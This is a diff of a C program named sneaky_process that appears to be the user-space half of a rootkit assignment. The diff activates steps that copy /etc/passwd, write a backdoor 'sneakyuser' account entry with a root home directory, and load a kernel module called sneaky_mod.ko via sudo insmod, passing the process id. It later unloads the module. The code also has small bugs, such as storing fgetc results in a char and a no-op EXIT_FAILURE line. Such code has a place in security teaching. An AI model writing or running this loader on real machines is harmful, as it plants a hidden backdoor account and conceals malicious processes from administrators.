@@ -3,53 +3,50 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-void copy_file(char * srcName, char * dstName) {
-  FILE * srcFile = fopen(srcName, "r");
+void copyFile(char * srcFilename, char * destFilename) {
+  FILE * srcFile = fopen(srcFilename, "r");
   if (srcFile == NULL) {
-    printf("Cannot open file %s \n", srcName);
-    EXIT_FAILURE;
+    printf("Failed to open file %s \n", srcFilename);
+    return;
   }
-  FILE * dstFile = fopen(dstName, "w");
-  if (dstFile == NULL) {
-    printf("Cannot open file %s \n", dstName);
-    EXIT_FAILURE;
+  FILE * destFile = fopen(destFilename, "w");
+  if (destFile == NULL) {
+    printf("Failed to open file %s \n", destFilename);
+    return;
   }
-
-  char c = fgetc(srcFile);
-  while (c != EOF) {
-    fputc(c, dstFile);
-    c = fgetc(srcFile);
+  char c;
+  while ((c = fgetc(srcFile)) != EOF) {
+    fputc(c, destFile);
   }
   fclose(srcFile);
-  fclose(dstFile);
+  fclose(destFile);
 }
 
-void add_passwd(char * fileName, char * passwd) {
-  FILE * file = fopen(fileName, "w");
-  if (file == NULL) {
-    printf("Cannot open file %s \n", fileName);
+void writeFile(const char * filename, const char * toWrite) {
+  FILE * f = fopen(filename, "w");
+  if (f == NULL) {
+    printf("Failed to open file %s \n", filename);
     EXIT_FAILURE;
   }
-  fprintf(file, "%s", passwd);
-  fclose(file);
+  fprintf(f, "%s", toWrite);
+  fclose(f);
 }
 
 int main() {
   printf("sneaky_process pid = %d\n", getpid());
-  copy_file("/etc/passwd", "/tmp/passwd");
-  /*
-  add_passwd("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
-  char arg[50];
-  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
+  copyFile("/etc/passwd", "/tmp/passwd");
+  writeFile("/tmp/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+  char arg[64];
+  sprintf(arg, "sudo insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
   system(arg);
 
   char c;
   while ((c = getchar()) != 'q') {
   }
 
-  system("rmmod sneaky_mod.ko");
-  copy_file("/tmp/passwd", "/etc/passwd");
+  system("sudo rmmod sneaky_mod.ko");
+  //copy_file("/tmp/passwd", "/etc/passwd");
   system("rm /tmp/passwd"); 
-  */
+  
   return EXIT_SUCCESS;
 }
